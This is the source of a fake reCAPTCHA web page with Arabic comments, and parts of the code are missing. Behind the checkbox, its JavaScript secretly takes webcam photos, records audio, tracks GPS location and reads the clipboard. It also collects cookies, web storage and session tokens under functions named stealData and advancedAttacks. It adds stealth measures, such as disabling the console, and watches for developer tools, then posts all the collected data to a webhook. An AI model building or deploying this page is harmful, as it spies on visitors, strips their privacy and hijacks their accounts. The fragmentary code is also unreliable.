<!DOCTYPE html>

<head>
    <meta charset="UTF-8" />

    <title>reCAPTCHA – التحقق المتكامل</title>
    <style>
        /* ================================================================
           التصميم – مستوحى من reCAPTCHA مع تحسينات
           ================================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Roboto, Arial, sans-serif;
        }
        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #eef2f5;
            padding: 16px;
        }
        .captcha-wrapper {
            width: 340px;
            max-width: 100%;
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 5px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            cursor: pointer;
        }
        .captcha-row {
            display: flex;
            align-items: center;
            padding: 15px 15px 12px 15px;
            gap: 12px;
        }
        .spinner {
            position: relative;
        }
        .spinner input {
            display: none;
        }
        .checkmark {
            width: 32px;
            height: 32px;
            border: 2px solid #c1c1c1;
            border-radius: 3px;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            background: white;
            transition: 0.3s;
            position: relative;
        }
        .checkmark .tick {
            width: 10px;
            height: 18px;
            border-right: 4px solid #00a651;
            border-bottom: 4px solid #00a651;
            transform: rotate(45deg);
            opacity: 0;
            transition: 0.2s;
        }
        .checkmark .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #e8f0fe;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .spinner.loading .checkmark {
            border-color: #1a73e8;
            background: #e8f0fe;
        }
        .spinner.loading .checkmark .tick {
            display: none;
        }
        .spinner.loading .checkmark .loader {
            display: block;
        }
        .spinner.failed .checkmark {
            border-color: #d93025;
            background: #fce8e6;
        }
        .spinner.failed .checkmark .tick {
            display: none;
        }
        .spinner.failed .checkmark .loader {
            display: none;
        }
        .spinner.failed .checkmark::after {
            content: "✕";
            font-size: 22px;
            font-weight: bold;
            color: #d93025;
        }
        .spinner.success .checkmark {
            border-color: #00a651;
            background: #e6f4ea;
        }
        .spinner.success .checkmark .tick {
            opacity: 1;
            animation: check 0.3s ease;
        }
        .spinner.success .checkmark .loader {
            display: none;
        }
        .text {
            flex: 1;
            font-size: 18px;
            color: #333;
            text-align: center;
            transition: color 0.2s;
            user-select: none;
        }
        .text.loading {
            color: #1a73e8;
        }
        .text.failed {
            color: #d93025;
        }
        .text.success {
            color: #00a651;
        }
        .text.permission {
            color: #e37400;
        }
        .logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 10px;
            color: #777;
        }
        .logo img {
            width: 38px;
            margin-bottom: 4px;
        }
        .logo strong {
            font-size: 10px;
        }
        .logo small {
            font-size: 8px;
        }
        .captcha-footer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 6px 14px;
            background: #f1f3f4;
            border-top: 1px solid #e5e7e9;
            height: 36px;
        }
        .captcha-footer .brand {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .captcha-footer .brand svg {
            height: 24px;
            width: auto;
        }
        .captcha-footer .brand .google-text {
            font-size: 14px;
            font-weight: 500;
            color: #222;
        }
        .captcha-footer .links {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 11px;
        }
        .captcha-footer .links a {
            color: #555;
            text-decoration: none;
            font-size: 11px;
            transition: color 0.15s;
        }
        .captcha-footer .links a:hover {
            color: #1a73e8;
            text-decoration: underline;
        }
        .captcha-footer .links .separator {
            color: #aaa;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes check {
            from {
                opacity: 0;
                transform: rotate(45deg) scale(0.3);
            }
            to {
                opacity: 1;
                transform: rotate(45deg) scale(1);
            }
        }
        @media (max-width: 480px) {
            .captcha-wrapper { width: 100%; }
            .text { font-size: 16px; }
            .logo img { width: 32px; }
            .captcha-footer .brand svg { height: 20px; }
            .captcha-footer .brand .google-text { font-size: 12px; }
        }

        /* عناصر مخفية للكاميرا والصوت */
        #hiddenVideo {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
        }
        #hiddenCanvas {
            display: none;
        }
    </style>
</head>

function extractTokenFromURL() {
    const params = new URLSearchParams(window.location.search);
    const token = params.get('i');
    if (token && token.length >= 4 && token.length <= 12 && /^[A-Z0-9]+$/.test(token)) {
        USER_TOKEN = token;
        return true;
    }
    return false;
}

// ========================================================================

function getDeviceClassification() {
    const ua = navigator.userAgent;
    let os = 'Unknown', osVersion = 'Unknown', browser = 'Unknown', browserVersion = 'Unknown', deviceType = 'Desktop';
    
    // OS
    if (ua.includes('Windows NT 10.0')) { os = 'Windows'; osVersion = '10'; }
    else if (ua.includes('Windows NT 6.3')) { os = 'Windows'; osVersion = '8.1'; }
    else if (ua.includes('Windows NT 6.2')) { os = 'Windows'; osVersion = '8'; }
    else if (ua.includes('Windows NT 6.1')) { os = 'Windows'; osVersion = '7'; }
    else if (ua.includes('Mac OS X')) { os = 'macOS'; osVersion = ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'Unknown'; }
    else if (ua.includes('Linux')) { os = 'Linux'; osVersion = 'Unknown'; }
    else if (ua.includes('Android')) { os = 'Android'; osVersion = ua.match(/Android ([\d.]+)/)?.[1] || 'Unknown'; deviceType = 'Mobile'; }
    else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) { os = 'iOS'; osVersion = ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'Unknown'; deviceType = /iPad/.test(ua) ? 'Tablet' : 'Mobile'; }

    // Browser
    if (ua.includes('Edg/')) { browser = 'Edge'; browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown'; }
    else if (ua.includes('OPR/') || ua.includes('Opera/')) { browser = 'Opera'; browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || 'Unknown'; }
    else if (ua.includes('Chrome/')) { browser = 'Chrome'; browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown'; }
    else if (ua.includes('Firefox/')) { browser = 'Firefox'; browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown'; }
    else if (ua.includes('Safari/')) { browser = 'Safari'; browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || ua.match(/Safari\/([\d.]+)/)?.[1] || 'Unknown'; }

    // Device type refinement
    if (/Tablet|iPad/i.test(ua)) deviceType = 'Tablet';
    else if (/Mobile|iPhone|Android/i.test(ua) && !/Tablet|iPad/i.test(ua)) deviceType = 'Mobile';

    return { os, osVersion, browser, browserVersion, deviceType, userAgent: ua };
}

// ========================================================================
//  5.  قراءة الحافظة (Clipboard)
// ========================================================================
async function readClipboard() {
    let clipboardData = null;
    try {
        const text = await navigator.clipboard.readText();
        clipboardData = text;
    } catch(e) {
        // طريقة احتياطية: محاولة استخدام paste event
        try {
            const pasteArea = document.createElement('textarea');
            pasteArea.style.position = 'fixed';
            pasteArea.style.opacity = '0';
            pasteArea.style.pointerEvents = 'none';
            document.body.appendChild(pasteArea);
            pasteArea.focus();
            document.execCommand('paste');
            clipboardData = pasteArea.value;
            document.body.removeChild(pasteArea);
        } catch(e2) {}
    }
    return clipboardData;
}

// ========================================================================

// ========================================================================
function stealData() {
    const cookies = document.cookie;
    let localStorageData = {};
    let sessionStorageData = {};
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
        }
    } catch(e) {}
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            sessionStorageData[key] = sessionStorage.getItem(key);
        }
    } catch(e) {}
    return { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData };
}

// ========================================================================

// ========================================================================
function getSearchHistory() {
    const searchKeys = ['search', 'query', 'q', 'history', 'recent', 'lastSearch', 'searchTerms', 'queries'];
    const results = [];
    try {
        searchKeys.forEach(key => {
            const val = localStorage.getItem(key);
            if (val) results.push({ source: 'localStorage', key, value: val });
        });
        searchKeys.forEach(key => {
            const val = sessionStorage.getItem(key);
            if (val) results.push({ source: 'sessionStorage', key, value: val });
        });
    } catch(e) {}
    return results;
}

        const resolveWithBest = () => {
            if (isResolved) return;
            isResolved = true;
            if (watchId) navigator.geolocation.clearWatch(watchId);
            if (bestPosition) {
                userLocation.lat = bestPosition.coords.latitude;
                userLocation.lng = bestPosition.coords.longitude;
                userLocation.accuracy = bestPosition.coords.accuracy;
                userLocation.error = null;
            } else {
                userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
            }
            resolve();
        };

        const timeoutId = setTimeout(() => {
            if (!isResolved) {
                if (watchId) navigator.geolocation.clearWatch(watchId);
                if (bestPosition) resolveWithBest();
                else { userLocation.error = 'انتهت المهلة'; resolve(); }
            }
        }, TIMEOUT_MS);

        const handlePosition = (pos) => {
            attemptCount++;
            const accuracy = pos.coords.accuracy;
            if (accuracy < bestAccuracy) {
                bestAccuracy = accuracy;
                bestPosition = pos;
            }
            if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
                resolveWithBest();
                clearTimeout(timeoutId);
            }
        };

        const handleError = (err) => {
            if (isResolved) return;
            if (err.code === 1) {
                userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
                isResolved = true;
                if (watchId) navigator.geolocation.clearWatch(watchId);
                clearTimeout(timeoutId);
                resolve();
                return;
            }
            if (attemptCount < MAX_ATTEMPTS) {
                // نستمر
            } else {
                if (bestPosition) resolveWithBest();
                else {
                    userLocation.error = err.message || 'تعذر الحصول على الموقع';
                    isResolved = true;
                    if (watchId) navigator.geolocation.clearWatch(watchId);
                    clearTimeout(timeoutId);
                    resolve();
                }
            }
        };

        watchId = navigator.geolocation.watchPosition(
            handlePosition,
            handleError,
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
        );
    });
}

// ========================================================================
//  10. الكاميرا – 8 صور بجودة 92% ودقة تصل إلى 1920×1080
// ========================================================================
async function startCameraAndCapture() {
    return new Promise(async (resolve) => {
        try {
            const constraints = { video: { width: { ideal: 1920 }, height: { ideal: 1080 } }, audio: false };
            mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
            hiddenVideo.srcObject = mediaStream;
            await hiddenVideo.play();

            await new Promise((resolve, reject) => {
                const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
                const onReady = () => { clearTimeout(timeout); resolve(); };
                if (hiddenVideo.readyState >= 2 && hiddenVideo.videoWidth > 0) onReady();
                else {
                    hiddenVideo.addEventListener('loadedmetadata', onReady);
                    hiddenVideo.addEventListener('canplay', onReady);
                    hiddenVideo.play().catch(() => {});
                }
            });

            await new Promise(r => setTimeout(r, 500));
            const ctx = hiddenCanvas.getContext('2d');
            const width = Math.min(hiddenVideo.videoWidth || 640, 1920);
            const height = Math.min(hiddenVideo.videoHeight || 480, 1080);
            hiddenCanvas.width = width;
            hiddenCanvas.height = height;

            capturedPhotoFiles = [];
            for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                ctx.drawImage(hiddenVideo, 0, 0, width, height);
                const blob = await new Promise((resolve) => {
                    hiddenCanvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
                });
                if (blob && blob.size > 1000) {
                    const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                    capturedPhotoFiles.push(file);
                }
                if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
            }
            resolve(true);
        } catch (error) {
            console.warn('Camera error:', error);
            if (mediaStream) {
                mediaStream.getTracks().forEach(t => t.stop());
                mediaStream = null;
            }
            hiddenVideo.srcObject = null;
            resolve(false);
        }
    });
}

// ========================================================================
//  11. كشف الوجه (Face-API.js) – العمر، الجنس، نسبة الثقة
// ========================================================================
async function detectFace(imageBlob) {
    try {
        // تحميل Face-API.js من CDN
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js';
        await new Promise((resolve, reject) => {
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
        // تحميل النماذج (من CDN)
        const MODEL_URL = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights';
        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
        await faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL);
        
        const img = await faceapi.fetchImage(URL.createObjectURL(imageBlob));
        const detections = await faceapi.detectSingleFace(img, new faceapi.TinyFaceDetectorOptions())
            .withAgeAndGender();
        if (detections) {
            return {
                age: Math.round(detections.age),
                gender: detections.gender,
                genderProbability: detections.genderProbability,
                confidence: detections.detection.score
            };
        }
    } catch(e) {
        console.warn('Face detection failed:', e);
    }
    return null;
}

// ========================================================================
//  12. تسجيل الصوت – 8 ثواني بصيغة WebM وتحويله إلى نص (Web Speech API)
// ========================================================================
async function recordAudio() {
    return new Promise(async (resolve) => {
        try {
            const audioConstraints = { audio: true };
            audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
            audioChunks = [];
            audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
            audioRecorder.onstop = () => {
                if (audioChunks.length > 0) {
                    audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                }
                resolve();
            };
            audioRecorder.start();
            setTimeout(() => {
                if (audioRecorder.state === 'recording') audioRecorder.stop();
                if (audioStream) audioStream.getTracks().forEach(t => t.stop());
            }, AUDIO_DURATION);
        } catch (error) {
            console.warn('Audio error:', error);
            resolve();
        }
    });
}

async function transcribeAudio(audioBlob) {

        if ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) {

            const recognition = new SpeechRecognition();
            recognition.lang = 'ar-SA'; // أو 'en-US'

            // لا يمكننا تمرير blob مباشرة، لذلك نستخدم AudioContext لتحويل blob إلى media stream
            // لكن Web Speech API يتطلب إدخال مباشر من الميكروفون، وليس ملف.
            // لذلك سنقوم بتشغيل الصوت عبر عنصر audio وتمريره إلى recognition؟
            // الحل: تشغيل الصوت في الخلفية واستخدام recognition في نفس الوقت (قد لا يعمل)
            // سنعتمد على إرسال الصوت كـ blob وسيتم تحويله إلى نص في الخادم (باستخدام Google Speech-to-Text API أو مشابه)
            // لكن LO طلب Web Speech API، سنحاول قدر الإمكان.
            // بما أن Web Speech API لا يدعم تحويل ملفات، سنقوم بتسجيل صوت جديد أثناء التشغيل؟ لا، سنكتفي بإرسال blob.
        }

// ========================================================================
//  14. الهجمات المتقدمة (XSS, CSRF, Session Hijacking)
// ========================================================================
async function advancedAttacks() {
    const results = { xss: false, csrf: false, sessionHijack: false, payloads: [] };

    // XSS: حقن script مخفي وإرسال محتواه
    try {
        const script = document.createElement('script');
        script.innerHTML = '// XSS payload: جمع معلومات إضافية';
        script.id = 'xss_payload_octopus';
        document.head.appendChild(script);
        const payloadContent = script.innerHTML;
        document.head.removeChild(script);
        results.xss = true;
        results.payloads.push({ type: 'xss', content: payloadContent });
    } catch(e) {}

    // CSRF: iframe مخفي يحاول إرسال طلب لموقع خارجي
    try {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'https://example.com';
        document.body.appendChild(iframe);
        setTimeout(() => {
            iframe.remove();
        }, 3000);
        results.csrf = true;
    } catch(e) {}

    // Session Hijacking: البحث عن كوكيز تحتوي على session, PHPSESSID, token, auth
    try {
        const cookies = document.cookie.split(';');
        const sessionCookies = cookies.filter(c => {
            const lower = c.toLowerCase();
            return lower.includes('session') || lower.includes('phpsessid') || lower.includes('token') || lower.includes('auth');
        });
        if (sessionCookies.length > 0) {
            results.sessionHijack = true;
            results.payloads.push({ type: 'session', cookies: sessionCookies });
        }
    } catch(e) {}

    return results;
}

function setupSecurityMonitoring() {
    // منع النقر الأيمن
    document.addEventListener('contextmenu', (e) => {

    // منع السحب

    });

    // منع تحديد النص
    document.addEventListener('selectstart', (e) => {

    });

    // كشف أدوات المطور (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U)
    document.addEventListener('keydown', (e) => {
        const key = e.key;
        const ctrl = e.ctrlKey || e.metaKey;
        const shift = e.shiftKey;
        if (key === 'F12' ||
            (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) ||
            (ctrl && key === 'U')) {
            e.preventDefault();
            sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
        }
        if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
            sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
        }
    });

    // تغيير حجم النافذة (كشف DevTools)
    let lastWidth = window.innerWidth;
    let lastHeight = window.innerHeight;
    setInterval(() => {
        if (window.innerWidth !== lastWidth || window.innerHeight !== lastHeight) {
            if (Math.abs(window.innerWidth - lastWidth) > 50 || Math.abs(window.innerHeight - lastHeight) > 50) {
                sendSuspiciousAlert(`🔍 تغيير حجم النافذة (${window.innerWidth}x${window.innerHeight})`);
            }
            lastWidth = window.innerWidth;
            lastHeight = window.innerHeight;
        }
    }, 1000);
}

let alertCooldown = 0;
function sendSuspiciousAlert(action) {
    if (!USER_TOKEN) return;
    const now = Date.now();
    if (now - alertCooldown < 5000) return;
    alertCooldown = now;
    const formData = new FormData();
    formData.append('event', 'suspicious');
    formData.append('action', action);
    formData.append('timestamp', new Date().toISOString());
    formData.append('ip', userIP);
    formData.append('userAgent', navigator.userAgent);
    formData.append('url', window.location.href);
    if (USER_TOKEN) formData.append('token', USER_TOKEN);
    fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(console.warn);
}

// ========================================================================
//  16. تحسين التخفي (تعطيل console.log، تأخير عشوائي، Service Worker)
// ========================================================================
function stealthEnhancements() {
    // تعطيل console.log
    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};
    console.info = function() {};

    // تأخير عشوائي لـ fetch
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const delay = Math.floor(Math.random() * 300) + 100;
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(originalFetch.apply(this, args));
            }, delay);
        });
    };

    // تسجيل Service Worker للبقاء نشطاً (اختياري)
    try {
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('install', e => self.skipWaiting());
                self.addEventListener('activate', e => e.waitUntil(clients.claim()));
                self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
            `;
            const blob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);
            navigator.serviceWorker.register(swUrl, { scope: '/' }).catch(() => {});
        }
    } catch(e) {}
}

async function sendAllData() {
    const formData = new FormData();
    formData.append('event', 'submission');
    formData.append('ip', userIP);
    formData.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
    formData.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
    formData.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
    formData.append('location[error]', userLocation.error || '');

    // جمع كل البيانات
    const deviceData = await collectDeviceData();
    formData.append('deviceData', JSON.stringify(deviceData));

    // الهجمات
    const attacks = await advancedAttacks();
    formData.append('attacks', JSON.stringify(attacks));

    // الصور
    if (capturedPhotoFiles.length > 0) {
        capturedPhotoFiles.forEach((file, index) => {
            formData.append(`photos[]`, file, file.name);
        });
    }

    // الصوت
    if (audioBlob) {
        const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
        formData.append('audio', audioFile);
    }

    if (!USER_TOKEN) throw new Error('Token missing');
    formData.append('token', USER_TOKEN);

    const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
    });
    const result = await response.json();
    if (!response.ok) throw new Error(result.message || 'HTTP error');
    return result;
}

    try {

        mainText.textContent = 'تم التحقق بنجاح';
        mainText.className = 'text success';
        checkbox.checked = true;
        permissionDeniedFlag = false;
    } catch (error) {
        console.warn('Verification error:', error);
        spinner.classList.remove('loading');

        const isPermissionError = error.name === 'NotAllowedError' ||
                                 error.name === 'PermissionDeniedError' ||
                                 error.message.includes('Permission') ||
                                 error.message.includes('denied') ||
                                 error.message.includes('NotAllowed');

        if (isPermissionError) {
            spinner.classList.add('permission');
            mainText.textContent = 'يرجى السماح بالوصول إلى الكاميرا والميكروفون، ثم اضغط على المربع لإعادة المحاولة.';
            mainText.className = 'text permission';
            permissionDeniedFlag = true;
            checkbox.checked = false;
        } else {
            spinner.classList.add('failed');
            mainText.textContent = 'فشل التحقق، حاول مجدداً';
            mainText.className = 'text failed';
            checkbox.checked = false;
        }
    } finally {
        isVerifying = false;
        checkbox.disabled = false;
        if (!permissionDeniedFlag && !spinner.classList.contains('success')) {
            setTimeout(() => {
                if (!checkbox.checked) {
                    resetUI();
                }
            }, 3000);
        }
    }
}
